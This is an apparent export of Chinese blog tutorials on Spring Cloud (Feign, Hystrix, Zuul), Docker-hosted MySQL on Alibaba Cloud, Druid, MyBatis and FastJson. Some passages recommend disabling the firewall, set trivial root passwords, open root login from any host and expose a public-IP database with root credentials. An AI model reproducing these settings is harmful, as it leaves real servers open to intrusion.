配置WebAdminFeignApplication123456789101112131415161718package com.funtl.hello.spring.cloud.web.admin.feign;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.cloud.client.discovery.EnableDiscoveryClient;import org.springframework.cloud.netflix.hystrix.dashboard.EnableHystrixDashboard;import org.springframework.cloud.openfeign.EnableFeignClients;@SpringBootApplication@EnableDiscoveryClient@EnableFeignClients@EnableHystrixDashboardpublic class WebAdminFeignApplication &#123; public static void main(String[] args)&#123; SpringApplication.run(WebAdminFeignApplication.class,args); &#125;&#125; HystrixDashboardConfiguration配置123456789101112131415161718192021222324252627282930package com.funtl.hello.spring.cloud.web.admin.feign.config;import com.netflix.hystrix.contrib.metrics.eventstream.HystrixMetricsStreamServlet;import org.springframework.boot.web.servlet.ServletRegistrationBean;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import javax.servlet.Servlet;import javax.servlet.ServletRegistration;@Configurationpublic class HystrixDashboardConfiguration &#123; @Bean //注册一个servlet public ServletRegistrationBean getServlet()&#123; HystrixMetricsStreamServlet streamServlet = new HystrixMetricsStreamServlet(); ServletRegistrationBean registrationBean = new ServletRegistrationBean(streamServlet); registrationBean.setLoadOnStartup(1); //servlet 访问路径 registrationBean.addUrlMappings("/hystrix.stream"); registrationBean.setName("HystrixMetricsStreamServlet"); return registrationBean ; &#125;&#125; 配置接口 AdminService用于服务的请求1234567891011121314151617181920package com.funtl.hello.spring.cloud.web.admin.feign.service;import com.funtl.hello.spring.cloud.web.admin.feign.service.hystrix.AdminServiceHystrix;import org.springframework.cloud.openfeign.FeignClient;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestMethod;import org.springframework.web.bind.annotation.RequestParam;import sun.awt.SunHints;// 利用注解配置到Eureaka服务注册与发现@FeignClient(value = "hello-spring-cloud-service-admin",fallback = AdminServiceHystrix.class)public interface AdminService &#123; @RequestMapping(value = "hi" ,method = RequestMethod.GET) String sayHi(@RequestParam(value = "message") String message);&#125; 配置AdminController1234567891011121314151617181920package com.funtl.hello.spring.cloud.web.admin.feign.controller;import com.funtl.hello.spring.cloud.web.admin.feign.service.AdminService;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestMethod;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class AdminController &#123; @Autowired private AdminService adminservice ; @RequestMapping(value = "hi", method = RequestMethod.GET) public String sayHi(@RequestParam String message)&#123; return adminservice.sayHi(message); &#125;&#125; 配置AdminServiceHystrix创建熔断器类并实现对应的 Feign 接口 ，用于实现ｆeign熔断接口，实现在注解 ＊ @FeignClient(value = “hello-spring-cloud-service-admin”,fallback = AdminServiceHystrix.class) 中的ｆallback＊ 123456789101112131415package com.funtl.hello.spring.cloud.web.admin.feign.service.hystrix;import com.funtl.hello.spring.cloud.web.admin.feign.service.AdminService;import org.springframework.stereotype.Component;@Componentpublic class AdminServiceHystrix implements AdminService &#123; @Override public String sayHi(String message) &#123; return String.format("hi, your message is : %s but request error",message) ; &#125;&#125; 使用路由网管统一进行管理创建Dictionary spring-cloud-eureka 创建目录结构 如图 创建pom.xml配置文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;com.funtl&lt;/groupId&gt; &lt;artifactId&gt;hello-spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt; &lt;relativePath&gt;../hello-spring-cloud-dependencies/pom.xml&lt;/relativePath&gt; &lt;/parent&gt; &lt;artifactId&gt;hello-spring-cloud-zuul&lt;/artifactId&gt; &lt;packaging&gt;jar&lt;/packaging&gt; &lt;name&gt;hello-spring-cloud-zuul&lt;/name&gt; &lt;url&gt;http://www.funtl.com&lt;/url&gt; &lt;inceptionYear&gt;2018-Now&lt;/inceptionYear&gt; &lt;dependencies&gt; &lt;!-- Spring Boot Begin --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- Spring Boot End --&gt; &lt;!-- Spring Cloud Begin --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- Spring Cloud End --&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;mainClass&gt;com.funtl.hello.spring.cloud.zuul.ZuulApplication&lt;/mainClass&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;&lt;/project&gt; 配置application.yml1234567891011121314151617181920spring: application: name: hello-spring-cloud-zuulserver: port: 8769eureka: client: serviceUrl: defaultZone: http://localhost:8761/eureka/zuul: routes: api-a: path: /api/a/** serviceId: hello-spring-cloud-web-admin-ribbon api-b: path: /api/b/** serviceId: hello-spring-cloud-web-admin-feign 配置ZuulApplication1234567891011121314151617package com.funtl.hello.spring.cloud.zuul;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.cloud.netflix.eureka.EnableEurekaClient;import org.springframework.cloud.netflix.zuul.EnableZuulProxy;@SpringBootApplication@EnableEurekaClient@EnableZuulProxypublic class ZuulApplication &#123; public static void main(String[] args)&#123; SpringApplication.run(ZuulApplication.class,args); &#125;&#125; 配置 WebAdminFeignFallbackProvider123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263package com.funtl.hello.spring.cloud.zuul.provider;import com.fasterxml.jackson.databind.ObjectMapper;import org.springframework.cloud.netflix.zuul.filters.route.FallbackProvider;import org.springframework.http.HttpHeaders;import org.springframework.http.HttpStatus;import org.springframework.http.MediaType;import org.springframework.http.client.ClientHttpResponse;import java.io.ByteArrayInputStream;import java.io.IOException;import java.io.InputStream;import java.util.HashMap;import java.util.Map;public class WebAdminFeignFallbackProvider implements FallbackProvider &#123; @Override public String getRoute() &#123; return "hello-spring-cloud-web-admin-feign"; &#125; @Override public ClientHttpResponse fallbackResponse(String route, Throwable cause) &#123; return new ClientHttpResponse() &#123; @Override public HttpStatus getStatusCode() throws IOException &#123; return HttpStatus.OK; &#125; @Override public int getRawStatusCode() throws IOException &#123; return HttpStatus.OK.value(); &#125; @Override public String getStatusText() throws IOException &#123; return HttpStatus.OK.getReasonPhrase(); &#125; @Override public void close() &#123; &#125; @Override public InputStream getBody() throws IOException &#123; ObjectMapper objectMapper = new ObjectMapper(); Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); map.put("status", 200); map.put("message", "无法连接，请检查您的网络"); return new ByteArrayInputStream(objectMapper.writeValueAsString(map).getBytes("UTF-8")); &#125; @Override public HttpHeaders getHeaders() &#123; HttpHeaders headers = new HttpHeaders(); // 和 getBody 中的内容编码一致 headers.setContentType(MediaType.APPLICATION_JSON_UTF8); return headers; &#125; &#125;; &#125;&#125; 总结与展望报错问题由于是自己创建项目，自己配置工程，难免会出现一些问题，我创建这套工程的时候也出现了许多的问题 无法找到主类问题 解决方案 ： 删除根目录下的 .idea重新配置整个项目工程就ＯＫ了 Eureka下载速度慢 无解，还是要下载，第一次下载好了以后，后面就容易很多了，但是最好一次下载完不要丢包 ### 展望分布式创建这个只是一个基础结构，其实还有更多的可拓展部分，java Web的学习从微服务才算是真正的开始了，但是所有的概念都是很抽象的，所以前面的基础还是很重要的，更多的是项目的实践上手，还有经验。gitlab，docker,docker-compose都是需要不断的熟悉的。]]></content>
  </entry>
  <entry>
    <title><![CDATA[阿里云踩坑记录系列-navicat连接服务器上mysql]]></title>
    <url>%2F2019%2F03%2F23%2F%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-01-navicat%E8%BF%9E%E6%8E%A5%E6%9C%8D%E5%8A%A1%E5%99%A8%2F</url>
    <content type="text"><![CDATA[第二次踩坑阿里云服务器是的，阿里云服务器上的mysql数据库不是随随便便就能连上的，需要配置安全组，同时docker上的mysql有点小问题，似乎就无法使用mysql 的一系列的命令了，绝望，好了踩坑实战记录。 云主机的区别 ecs 和 轻量级应用主机是有区别的！！！ 轻量级的云主机是有自带的mysql 的需要重置才可以，否则的话是自带的mysql数据库会导致3306端口的占用，而且workpress是默认的东西。需要重置更改centous系统才可以。 安全组的配置 Esc是需要配置安全组的轻量级的应用云主机是直接在防火墙部分设置就好 对于数据库的版本问题（5.7 / 8.x 版本的区别） 对于5.7的安装版本 $ docker pull mysql:5.7 //拉取镜像 $ docker run -p 3306:3306 –name mysql \-v /usr/local/docker/mysql/conf:/etc/mysql \-v /usr/local/docker/mysql/logs:/var/log/mysql \-v /usr/local/docker/mysql/data:/var/lib/mysql \-e MYSQL_ROOT_PASSWORD=123456 \-d mysql根据上面的指令就可以完成自己的mysql的镜像的绑定了 对于8.x版本的数据库就更简单了 先ps一点东西哈 默认的 $ docker pull mysql这个的默认是要的latest也就是最近的版本目前的版本是8 class=”x所以一定要注意”&gt;&lt;/这个的默认是要的latest也就是最近的版本目前的版本是8.x$ docker pull mysql$ docker run –name mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 -d mysql然后就欧克了 刚刚从大佬那里知道，原来centos也就是中国用，国际流行的还是uubuntu，所以朋友们，用ubuntu吧，hhh 还有了解的东西 狗东西centos7.x的版本是带有防火墙，说到防火墙这个东西有点玄学了，我目前的状态是把防火墙关闭了。所以建议哈，navicat这类工具无法连接上的，可以试试把防火墙关了 （看评论说tomcat会受到这个的影响）systemctl start firewalld //开启systemctl stop firewalld //关闭systemctl status firewalld //查看状态systemctl disable firewalld //开机关闭systemctl enable firewalld //开机启动 我们也许是时候谈谈操蛋的mysql8了发生了什么mysql8添加了全新的安全认知，这样的结果就是我们不能成功的用navicat远程连接这个东西，尼玛，就算解决了验证方法，特喵的还不给你权限，你还要自己提权，唉，不说了，踩坑目录如瞎。 更改安全加密方式 进入容器 1docker exec -it mysql bash 登陆mysql 123mysql -u root -pALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;Lzslov123!&apos;; 查看加密方式 1234use mysql;select user,plugin from user where user=&apos;root&apos;; 更改加密方式 1alter user &apos;root&apos;@&apos;localhost&apos; identified with mysql_native_password by &apos;password&apos;; 刷新 1flush privileges; 更改权限1234567891011select user,authentication_string from user;update user set authentication_string=&apos;&apos; where user=&apos;root&apos;;alter user&apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;Mysql@123&apos;; alter user&apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;Mysql@123&apos;; flush privileges;ALTER USER &apos;root&apos;@&apos;%&apos; IDENTIFIED WITH mysql_native_password BY&apos;Mysql@123&apos;;]]></content>
  </entry>
  <entry>
    <title><![CDATA[springboot2.0x中关于数据连接池Druid的连接]]></title>
    <url>%2F2019%2F03%2F23%2FspringBoot-06-%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E6%B1%A0Druid%2F</url>
    <content type="text"><![CDATA[数据连接池 什么是数据库连接池？当系统使用JDBC技术访问数据库时会创建一个connection对象，而该对象的创建过程是非常消耗资源的，并且创建对象的时间也比较长，假设系统一天有1万次的访问量，那么一天就会创建1万connection对象，这极大的浪费数据库的资源，而且可能造成数据库服务器内存溢出、宕机。为了解决上面的问题，就引入了数据库连接池（Connection pooling），它主要用来分配、管理、释放数据库的连接。数据库连接池首先会创建若干（该数量可以配置）个connection对象并将这些对象放入到池中，当系统需要使用connection对象时，数据库连接池会从池中分配一个事先创建好的connection对象给系统，当系统使用完毕或超时后，数据库连接池会将该connection对象重新放入到池中。这样就减少了创建connection对象所耗费的资源和时间，可以提高对数据库操作的性能。 主流数据库连接池1.C3p02.dbcp3.tomcat jdbc pool4.Druid （我用的） application.yml的配置参数spring: datasource: 数据源基本配置 username: root password: 123456 driver-class-name: com.mysql.jdbc.Driver url: jdbc:mysql://localhost:3306/ssm_crud type: com.alibaba.druid.pool.DruidDataSource 数据源其他配置 初始化参数 initialSize: 5 minIdle: 5 maxActive: 20 maxWait: 60000 timeBetweenEvictionRunsMillis: 60000 minEvictableIdleTimeMillis: 300000 validationQuery: SELECT 1 FROM DUAL testWhileIdle: true testOnBorrow: false testOnReturn: false poolPreparedStatements: true 配置监控统计拦截的filters，去掉后监控界面sql无法统计，’wall’用于防火墙 filters: stat,wall,log4j maxPoolPreparedStatementPerConnectionSize: 20 useGlobalDataSourceStat: true connectionProperties: druid.stat.mergeSql=true;druid.stat.slowSqlMillis=500 配置config类由于数据连接池中的属性默认是tomcat的数据连接池，但是使用Druid需要配置其servlet以及filter 配置-01-DataSource— java @ConfigurationProperties(prefix = “spring.datasource”) //前缀：自定义数据源 @Bean //自定义一个数据源 public DataSource druid(){ return new DruidDataSource() ; } 配置-02-Servlet— java @Bean public ServletRegistrationBean statViewServlet(){ ServletRegistrationBean bean = new ServletRegistrationBean(new StatViewServlet(),”/druid/*”); Map&lt;String,String&gt; initParams = new HashMap&lt;&gt;(); initParams.put(&quot;loginUsername&quot;, &quot;admin&quot;) ; initParams.put(&quot;loginPassword&quot;, &quot;123456&quot;) ; initParams.put(&quot;allow&quot;, &quot;&quot;); //默认允许所有的访问 bean.setInitParameters(initParams); return bean ; } 配置-03-filter @Bean public FilterRegistrationBean webStatFilter(){ FilterRegistrationBean bean = new FilterRegistrationBean() ; Map&lt;String,String&gt; initParams = new HashMap&lt;&gt;() ; bean.setFilter(new WebStatFilter()); //不去拦截的文件 initParams.put(&quot;exclusions&quot;, &quot;*.js,*.css,/druid/*&quot;) ; bean.setInitParameters(initParams); bean.setUrlPatterns(Arrays.asList(&quot;/*&quot;)); return bean ; } 注意事项务必注意@Bean的配置，必须填入到AOP容器中，才会生效配置 在写配置类时候务必需要 @Configeration]]></content>
  </entry>
  <entry>
    <title><![CDATA[springboot整合Mybatis]]></title>
    <url>%2F2019%2F03%2F23%2FSpringBoot-07-Mybatis%E6%95%B4%E5%90%88%EF%BC%88%E6%B3%A8%E8%A7%A3)%2F</url>
    <content type="text"><![CDATA[Mybatis框架介绍 Mybatis是目前主流的轻量级框架，与之前的Hibernate相比，mybatis更加的灵活方便，并且Mybatis自身优化了starter来与springboot相适应Mybatis支持两种书写风格，xml配置和注解两种，很多大公司依然使用的是xml，但是按照springboot的推荐，注解版更简单，更受青睐（本节仍然使用druid连接池，配置文件依然使用yaml） maven依赖介绍12345678910111213141516171819202122232425262728&lt;!--JDBC的配置--&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-jdbc --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-jdbc&lt;/artifactId&gt; &lt;version&gt;5.1.3.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!--数据库连接池 Druid--&gt; &lt;!-- https://mvnrepository.com/artifact/com.alibaba/druid --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid&lt;/artifactId&gt; &lt;version&gt;1.1.10&lt;/version&gt; &lt;/dependency&gt; 以上的三个依赖是之前我们配置druid的时候就已经搞定的依赖，下面这个mybatis依赖，注意看 123456&lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.3.2&lt;/version&gt;&lt;/dependency&gt; mybatis的依赖并不是由springboot官方写好的starter而是自身去适应springboot而开发的starter 配置文件 .yml同样的，这里接着druid的配置就欧克了 1234567891011121314151617181920spring: datasource: username: root password: 123456 url: jdbc:mysql://47.106.103.49/SCS driver-class-name: com.mysql.jdbc.Driver type: com.alibaba.druid.pool.DruidDataSourceinitialSize: 5minIdle: 5maxActive: 20maxWait: 60000timeBetweenEvictionRunsMillis: 60000minEvictableIdleTimeMillis: 300000validationQuery: SELECT 1 FROM DUALtestWhileIdle: truetestOnBorrow: falsetestOnReturn: falsepoolPreparedStatements: true configuration配置123456789101112131415161718192021222324252627282930public DataSource DruidDataSource()&#123; return new DruidDataSource(); &#125; @Bean public ServletRegistrationBean statViewServlet()&#123; ServletRegistrationBean bean = new ServletRegistrationBean(new StatViewServlet(),"/druid/*"); Map&lt;String,String&gt; initParams = new HashMap&lt;&gt;(); initParams.put("loginUsername", "admin") ; initParams.put("loginPassword", "scsscs") ; initParams.put("allow", ""); //默认允许所有的访问 bean.setInitParameters(initParams); return bean ; &#125; @Bean public FilterRegistrationBean webStatFilter()&#123; FilterRegistrationBean bean = new FilterRegistrationBean() ; Map&lt;String,String&gt; initParams = new HashMap&lt;&gt;() ; bean.setFilter(new WebStatFilter()); //不去拦截的文件 initParams.put("exclusions", "*.js,*.css,/druid/*") ; bean.setInitParameters(initParams); bean.setUrlPatterns(Arrays.asList("/*")); return bean ; &#125; 书写Mapper映射1.首先我们需要创建一个model这里我们是单词，所以创建eword 类 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748public class eword &#123; private String English ; private String Quality ; private String Meaning ; private String Level ; private String U_phon ; public String getEnglish() &#123; return English; &#125; public void setEnglish(String english) &#123; English = english; &#125; public String getQuality() &#123; return Quality; &#125; public void setQuality(String quality) &#123; Quality = quality; &#125; public String getMeaning() &#123; return Meaning; &#125; public void setMeaning(String meaning) &#123; Meaning = meaning; &#125; public String getLevel() &#123; return Level; &#125; public void setLevel(String level) &#123; Level = level; &#125; public String getU_phon() &#123; return U_phon; &#125; public void setU_phon(String u_phon) &#123; U_phon = u_phon; &#125;&#125; 创建mapper注意mapper 的实现是需要interface接口的 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import org.apache.ibatis.annotations.Mapper;import org.apache.ibatis.annotations.Result;import org.apache.ibatis.annotations.Results;import org.apache.ibatis.annotations.Select;@Mapperpublic interface level4Word &#123; @Results(&#123; @Result(column="aw_english",property="English"), @Result(column="aw_meaning1",property="Meaning"), @Result(column = "aw_vocQuality",property = "Quality"), @Result(column = "aw_level1",property = "Level"), @Result(column = "aw_UKphonogram",property = "U_phon") &#125;) @Select("select * from allword") public eword[] getWordByID() ;&#125;``` #### 常用的注解@Insert --- 插入@Delete --- 删除@Update --- 更新@Select --- 查找@Param --- 入参@Results --- 字段统一 ： 这个部分其实和&lt;resultmap&gt;一样，就是为了解决字段名和实体类参数名不一样选用的 使用方法如上就是@Results（@Result（），····）### 学习网页链接https://blog.csdn.net/zlh313_01/article/details/80031583### Mybaties深入实战1. 对于mybaties框架，自动映射的机制无疑是备受追捧的，但是自动映射的背后有下有诸多的问题也让人措手不及，经过商城项目的具体实战，对于mybaties的思考有了更深一步的思考。2. 由于前后分离的大趋势之下，前端请求数据全靠跨域来解决，那么后端所可以获取的数据目前主流来看，最常用的就是json数据，但是json数据转为javaBean又是一门深入的学问，同时，爬虫爬去数据也令人头疼，由于多表数据混合，也让人头大。3. string =&gt; jsonString ， jsonString =&gt; javaBean ， javaBean =&gt; mybaties映射#### 获取跨域数据 RestTemplate同单体开发不同，跨域之后json数据都在ip地址的网页中，首要目的就是获取 网页上的json数据##### 配置 pom.xml``` xml &lt;dependency&gt; &lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt; &lt;artifactId&gt;httpclient&lt;/artifactId&gt; &lt;version&gt;4.5.5&lt;/version&gt; &lt;/dependency&gt; 配置Configuration12345678910111213141516package com.scs.web.config;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.http.client.HttpComponentsClientHttpRequestFactory;import org.springframework.web.client.RestTemplate;@Configurationpublic class TempleteConfig &#123; @Bean public RestTemplate httpClientRestTemplete()&#123; RestTemplate restTemplate = new RestTemplate(new HttpComponentsClientHttpRequestFactory()); return restTemplate ; &#125;&#125; 获取跨域ip的json数据只有一句代码简单吧12HashMap&lt;String,String&gt; json = restTemplate.getForObject("http://106.15.179.119:3007/",HashMap.class); JSON数据处理-FastJson 第三方json处理工具数不胜数，有阿里的fastjson，还有gson据说也很好，看个人需求了 json数据有两种 普通 json 和 Array，务必注意这两种，对json数据一定要分析清楚再建立实体类 跨域ip获取的String尽管看上去很像我们的所需要的json格式，但是fastjson处理的时候，不可以这么处理，一定要进行转化 fastjson 对于 JSON 和 JSONArray 是完全不同的处理方式 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384@RestControllerpublic class InitDataController &#123; /* @Autowired private RestTemplate restTemplate ; //List&lt;HCinema&gt; hCinemas ; @GetMapping("/initData") public Object InitData()&#123; List&lt;HCinema&gt; Infos ; String jsonStr = restTemplate.getForObject("http://106.15.179.119:3007/", String.class); String json = JSONArray.toJSONString(jsonStr) ; Infos = JSONArray.parseArray(json, HCinema.class); return Infos; &#125;*/ @Autowired private RestTemplate restTemplate ; @Autowired private CinemaInfo cinemaInfo ; //List&lt;HCinema&gt; hCinemas ; /*@GetMapping("/initData") public List&lt;HCinema&gt; InitData()&#123; List&lt;HCinema&gt; infos = new ArrayList&lt;&gt;(); HashMap&lt;String,Object&gt; resourceMap = restTemplate.getForObject("http://106.15.179.119:3007/",HashMap.class); resourceMap.forEach((key,v)-&gt;&#123; List&lt;BasicInfo&gt; baseInfo = JSONArray.parseArray(JSONArray.toJSONString(v), BasicInfo.class); HCinema temp = new HCinema(key, baseInfo) ; infos.add(temp); cinemaInfo.InitSCSData(temp) ; &#125;); return infos; &#125;*/ @GetMapping("/initData") public Object InitData()&#123; // 获取跨域数据 HashMap&lt;String,String&gt; json = restTemplate.getForObject("http://106.15.179.119:3007/",HashMap.class); for (String key:json.keySet()) &#123; //转由JSONArray转List HCinema temp = new HCinema(key, JSONArray.parseArray(JSONArray.toJSONString(json.get(key)), BasicInfo.class)); List&lt;BasicInfo&gt; baseTemp = temp.getMov(); for (BasicInfo basicInfo: baseTemp) &#123; List&lt;MovieFeature&gt; movTemp = basicInfo.getFeas() ; for (MovieFeature moInfo: movTemp) &#123; // mapper入表 moInfo.setBaseno(basicInfo.getNo()); cinemaInfo.InsertMovieFeature(moInfo); &#125; HashMap&lt;String,SaleVol&gt; salInfo = JSON.parseObject(JSON.toJSONString(basicInfo), HashMap.class); // mapper入表 basicInfo.setFieldName(key); cinemaInfo.InsertBasicInfo(basicInfo); // mapper入表 SaleVol saleInfo = JSON.parseObject(JSON.toJSONString(salInfo.get("feas_num")),SaleVol.class); saleInfo.setBaseno(basicInfo.getNo()); // mapper入表 cinemaInfo.InsertSaleVol(saleInfo); &#125; &#125; return "Success"; &#125;&#125; 代码分析12345678910111213141516171819202122232425262728293031323334353637383940414243&#123; "星烨": [ &#123; "begin_date": "2019-02-03", "casts": "古天乐;郑嘉颖;林峯;林家栋;", "copy_time": "98", "countries": "香港;中国大陆;", "directors": "林德禄 ;", "feas": [ &#123; "date": "2019-04-14", "end_time": "11:58", "film_lang": "国语", "film_name": "反贪风暴4", "film_no": "001100042019", "hall_name": "六号RGB三色激光厅", "is_3d": "0", "is_special": "0", "is_visable": "1", "no": "0000037045", "pFav": "9.90", "pStan": "50.00", "time": "10:20" &#125;, &#123; "date": "2019-04-14", "end_time": "14:48", "film_lang": "国语", "film_name": "反贪风暴4", "film_no": "001100042019", "hall_name": "二号厅(3D眼镜自备或5元起购)", "is_3d": "0", "is_special": "0", "is_visable": "1", "no": "0000037022", "pFav": "9.90", "pStan": "50.00", "time": "13:10" &#125; &#125; ]&#125; 非标准json，比如 “星烨” ,就只能用 java容器 map进行接受，否则后面的属性都会读取错误，且这是起始的问题，如果是后面的出现类似着这样的情况，果断建新表进行处理，对于实体类中含有容器，直接遍历解决，否则会出现诸多问题。 servlet配置12345678910111213141516171819202122232425package Service;import org.springframework.context.annotation.Bean;import org.springframework.http.HttpMethod;import org.springframework.http.ResponseEntity;import org.springframework.stereotype.Service;import org.springframework.util.MultiValueMap;import org.springframework.web.client.RestTemplate;@Servicepublic class HttpClient &#123; public String client(String url, HttpMethod method , MultiValueMap&lt;String,String&gt; params)&#123; RestTemplate template = new RestTemplate(); ResponseEntity&lt;String&gt; responseEntity = template.getForEntity(url, String.class); return responseEntity.getBody() ; &#125;&#125; 开启驼峰命名规则1234567891011121314@Configurationpublic class MybatiesConfig &#123; @Bean public ConfigurationCustomizer configurationCustomizer()&#123; return new ConfigurationCustomizer() &#123; @Override public void customize(org.apache.ibatis.session.Configuration configuration) &#123; configuration.setMapUnderscoreToCamelCase(true);//设置驼峰命名规则 &#125; &#125;; &#125;&#125; 处理fastjson中文乱码问题123456789101112131415161718192021222324252627282930313233package com.scs.web.config;import com.alibaba.fastjson.serializer.SerializerFeature;import com.alibaba.fastjson.support.config.FastJsonConfig;import com.alibaba.fastjson.support.spring.FastJsonHttpMessageConverter;import org.springframework.context.annotation.Configuration;import org.springframework.http.MediaType;import org.springframework.http.converter.HttpMessageConverter;import org.springframework.web.servlet.config.annotation.WebMvcConfigurationSupport;import java.util.ArrayList;import java.util.List;@Configurationpublic class MyFastJsonConfig extends WebMvcConfigurationSupport &#123; @Override public void configureMessageConverters(List&lt;HttpMessageConverter&lt;?&gt;&gt; converters)&#123; //创建fastJson消息转换器 FastJsonHttpMessageConverter fastJsonHttpMessageConverter = new FastJsonHttpMessageConverter(); //创建配置类 FastJsonConfig fastJsonConfig = new FastJsonConfig(); fastJsonConfig.setSerializerFeatures(SerializerFeature.PrettyFormat); //处理中文乱码问题 List&lt;MediaType&gt; fastMediaTypes = new ArrayList&lt;&gt;(); fastMediaTypes.add(MediaType.APPLICATION_JSON_UTF8); fastJsonHttpMessageConverter.setSupportedMediaTypes(fastMediaTypes); fastJsonHttpMessageConverter.setFastJsonConfig(fastJsonConfig); converters.add(fastJsonHttpMessageConverter); &#125;&#125;]]></content>
  </entry>
  <entry>
    <title><![CDATA[springboot Redis缓存服务]]></title>
    <url>%2F2019%2F03%2F23%2FSpringBoot-08-redis%E7%BC%93%E5%AD%98%E6%9C%8D%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[Springboot中的缓存机制讲解 web的大型工程的开发中，请求不可能每一次直接穿透到数据区进行数据访问，由于占用的系统资源过大，会导致系统资源负载过大而出现一系列问题 常见的缓存服务nosql , redis , MC ,mongodb , hive …]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F03%2F23%2FFiveLayerNetworkProtoco%2F</url>
